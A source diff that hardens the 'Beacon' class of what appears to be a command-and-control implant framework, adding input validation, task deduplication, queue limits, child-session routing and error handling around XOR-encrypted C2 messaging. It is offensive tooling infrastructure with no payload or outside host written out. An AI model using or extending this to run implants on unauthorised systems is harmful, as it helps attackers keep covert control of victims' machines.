@@ -374,6 +374,9 @@ Beacon::Beacon()
 
 void Beacon::run()
 {
+    if (!m_initialized)
+        return;
+
     bool exit = false;
     while (!exit)
     {
@@ -395,7 +398,13 @@ void Beacon::run()
         }
     }
 
-    checkIn();
+    try
+    {
+        checkIn();
+    }
+    catch (...)
+    {
+    }
 }
 
 
@@ -405,10 +414,13 @@ bool Beacon::initConfig(const std::string& config)
         {
                 nlohmann::json beaconConfig = nlohmann::json::parse(config);
 
-                if (!beaconConfig.contains("xorKey") || !beaconConfig.contains("ModulesConfig"))
+                if (!beaconConfig.contains("xorKey") || !beaconConfig.contains("ModulesConfig") ||
+                    !beaconConfig["xorKey"].is_string() || !beaconConfig["ModulesConfig"].is_object())
                         return false;
 
                 m_key = beaconConfig["xorKey"].get<std::string>();
+                if (m_key.empty())
+                        return false;
                 m_modulesConfig = beaconConfig["ModulesConfig"];
         }
         catch (const nlohmann::json::exception&)
@@ -416,6 +428,7 @@ bool Beacon::initConfig(const std::string& config)
                 return false;
         }
 
+        m_initialized = true;
         return true;
 }
 
@@ -423,6 +436,8 @@ bool Beacon::initConfig(const std::string& config)
 // Distribute commands from C2 address to this beacon and child beacons
 bool Beacon::cmdToTasks(const std::string& input)
 {
+    if (!m_initialized || input.size() > MaxC2EnvelopeSize * 2U)
+        return false;
     std::string data;
     try
     {
@@ -436,11 +451,13 @@ bool Beacon::cmdToTasks(const std::string& input)
     }
 
     // Decrypt the data using the beacon's XOR key
-    XOR(data, m_key);
+    if (!XOR(data, m_key))
+        return false;
 
     // Parse the decrypted data into a MultiBundleC2Message object
     MultiBundleC2Message multiBundleC2Message;
-    multiBundleC2Message.ParseFromArray(data.data(), (int)data.size());
+    if (!multiBundleC2Message.ParseFromArray(data.data(), static_cast<int>(data.size())))
+        return false;
 
     // Iterate over each BundleC2Message in the multi-bundle message
     for (int k = 0; k < multiBundleC2Message.bundlec2messages_size(); k++) 
@@ -455,31 +472,38 @@ bool Beacon::cmdToTasks(const std::string& input)
             for (int j = 0; j < bundleC2Message->c2messages_size(); j++) 
             {
                 const C2Message& c2Message = bundleC2Message->c2messages(j);
+                const bool deduplicate = c2Message.instruction() != Socks5Cmd;
+                if (deduplicate && !c2Message.uuid().empty() &&
+                    (m_queuedTaskIds.count(c2Message.uuid()) != 0 ||
+                     m_processedTaskIds.count(c2Message.uuid()) != 0))
+                    continue;
+                if (m_tasks.size() >= MaxPendingMessages)
+                    return false;
                 m_tasks.push(c2Message);
+                if (deduplicate && !c2Message.uuid().empty())
+                    m_queuedTaskIds.insert(c2Message.uuid());
             }
         }
         // Otherwise, the message is for a child session
         else
         {
-            // Iterate through all listeners
-            for(int i=0; i<m_listeners.size(); i++)
+            const std::string listenerHash = bundleC2Message->listenerhash();
+            if (listenerHash.empty())
+                return false;
+            Listener* route = nullptr;
+            for (const auto& listener : m_listeners)
             {
-                // Check each session for a matching beacon hash
-            for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
-                {
-                    std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
-
-                    if(ptr->getBeaconHash()==beaconhash)
-                    {
-                        // Queue each C2Message task for the matching child session
-                        for (int k = 0; k < bundleC2Message->c2messages_size(); k++) 
-                        {
-                            const C2Message& c2Message = bundleC2Message->c2messages(k);
-                            m_listeners[i]->queueTask(beaconhash, c2Message);
-                        }
-                    }
-                }
+                if (!listener->isSessionExist(beaconhash, listenerHash))
+                    continue;
+                if (route != nullptr)
+                    return false;
+                route = listener.get();
             }
+            if (bundleC2Message->c2messages_size() > 0 && route == nullptr)
+                return false;
+            for (int j = 0; j < bundleC2Message->c2messages_size(); j++)
+                if (!route->queueTask(beaconhash, listenerHash, bundleC2Message->c2messages(j)))
+                    return false;
         }
     }
 
@@ -491,6 +515,8 @@ bool Beacon::cmdToTasks(const std::string& input)
 // Create the response message from the results of all the commmands send to this beacon and child beacons
 bool Beacon::taskResultsToCmd(std::string& output)
 {
+    if (!m_initialized)
+        return false;
     // Handle results of commands address to this particular Beacon
     MultiBundleC2Message multiBundleC2Message;
     BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
@@ -507,22 +533,21 @@ bool Beacon::taskResultsToCmd(std::string& output)
     bundleC2Message->set_processId(m_pid);
     bundleC2Message->set_additionalInformation(m_additionalInfo);
 
-    while(!m_taskResult.empty())
+    std::queue<C2Message> taskResults = m_taskResult;
+    while(!taskResults.empty())
     {
-        C2Message c2MessageRet=m_taskResult.front();
-        // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
-        // addedC2MessageRet->CopyFrom(c2MessageRet);
+        C2Message c2MessageRet=taskResults.front();
         bundleC2Message->add_c2messages(c2MessageRet);
-        m_taskResult.pop();
+        taskResults.pop();
     }
 
     // Handle results of commands address to child sessions
-        for(int i=0; i<m_listeners.size(); i++)
+    struct DrainedResults { std::shared_ptr<Session> session; std::vector<C2Message> messages; };
+    std::vector<DrainedResults> drainedResults;
+        for(const auto& listener : m_listeners)
         {
-                for(std::size_t j=0; j<m_listeners[i]->getNumberOfSession(); j++)
+                for(const auto& ptr : listener->getSessionsSnapshot())
         {
-            std::shared_ptr<Session> ptr = m_listeners[i]->getSessionPtr(j);
-
             BundleC2Message *bundleC2Message = multiBundleC2Message.add_bundlec2messages();
             
             // TODO check of m_taskResult contain a getInfo cmd and add context info if it does
@@ -538,22 +563,31 @@ bool Beacon::taskResultsToCmd(std::string& output)
             bundleC2Message->set_processId(ptr->getProcessId());
             bundleC2Message->set_additionalInformation(ptr->getAdditionalInformation());
 
-            C2Message c2Message = ptr->getTaskResult();
-            while(!c2Message.instruction().empty())
+            auto childResults = ptr->drainTaskResults();
+            for (const auto& c2Message : childResults)
             {
-                // C2Message *addedC2MessageRet = bundleC2Message->add_c2messages();
-                // addedC2MessageRet->CopyFrom(c2Message);
                 bundleC2Message->add_c2messages(c2Message);
-                c2Message = ptr->getTaskResult();
             }
+            drainedResults.push_back({ptr, std::move(childResults)});
         }
     }
 
     std::string data;
-    multiBundleC2Message.SerializeToString(&data);
+    if (!multiBundleC2Message.SerializeToString(&data) || !XOR(data, m_key))
+    {
+        for (const auto& drained : drainedResults)
+            drained.session->restoreTaskResults(drained.messages);
+        return false;
+    }
 
-    XOR(data, m_key);
     output = base64_encode(data);
+
+    while (!m_taskResult.empty())
+    {
+        if (m_taskResult.front().instruction() == ListenerPollCmd)
+            m_pendingListenerPolls.erase(m_taskResult.front().returnvalue());
+        m_taskResult.pop();
+    }
 
     return true;
 }
@@ -570,7 +604,7 @@ bool Beacon::runTasks()
         int result = (*it)->recurringExec(c2RetMessage);
 
         // If the module executed successfully, store the result for response construction.
-        if (result)
+        if (result && m_taskResult.size() < MaxPendingMessages)
             m_taskResult.push(c2RetMessage);
     }
 
@@ -578,13 +612,28 @@ bool Beacon::runTasks()
     // These are one-time commands sent from the C2 server.
     while (!m_tasks.empty())
     {
+        if (m_taskResult.size() >= MaxPendingMessages)
+            break;
         C2Message c2Message = m_tasks.front();
         m_tasks.pop();
+        if (c2Message.instruction() != Socks5Cmd)
+            m_queuedTaskIds.erase(c2Message.uuid());
 
         C2Message c2RetMessage;
-        
-        // Execute the instruction and generate the response.
-        bool exit = execInstruction(c2Message, c2RetMessage);
+        bool exit = false;
+        try
+        {
+            exit = execInstruction(c2Message, c2RetMessage);
+        }
+        catch (...)
+        {
+            c2RetMessage.set_instruction(c2Message.instruction());
+            c2RetMessage.set_cmd(c2Message.cmd());
+            c2RetMessage.set_uuid(c2Message.uuid());
+            c2RetMessage.set_errorCode(1);
+        }
+        if (c2Message.instruction() != Socks5Cmd)
+            rememberProcessedTask(c2Message.uuid());
 
         // Store the result of the execution.
         m_taskResult.push(std::move(c2RetMessage));
@@ -605,11 +654,26 @@ bool Beacon::runTasks()
         listenerProofOfLife.set_returnvalue(m_listeners[i]->getListenerHash());         // Include unique listener identifier.
 
         // Add the heartbeat to the response queue.
-        m_taskResult.push(listenerProofOfLife);
+        const std::string listenerHash = m_listeners[i]->getListenerHash();
+        if (m_taskResult.size() < MaxPendingMessages && m_pendingListenerPolls.insert(listenerHash).second)
+            m_taskResult.push(listenerProofOfLife);
     }
 
     // No exit signal was received; continue beacon execution.
     return false;
+}
+
+void Beacon::rememberProcessedTask(const std::string& uuid)
+{
+    if (uuid.empty() || m_processedTaskIds.count(uuid) != 0)
+        return;
+    m_processedTaskIds.insert(uuid);
+    m_processedTaskOrder.push_back(uuid);
+    if (m_processedTaskOrder.size() > MaxPendingMessages)
+    {
+        m_processedTaskIds.erase(m_processedTaskOrder.front());
+        m_processedTaskOrder.pop_front();
+    }
 }
 
 
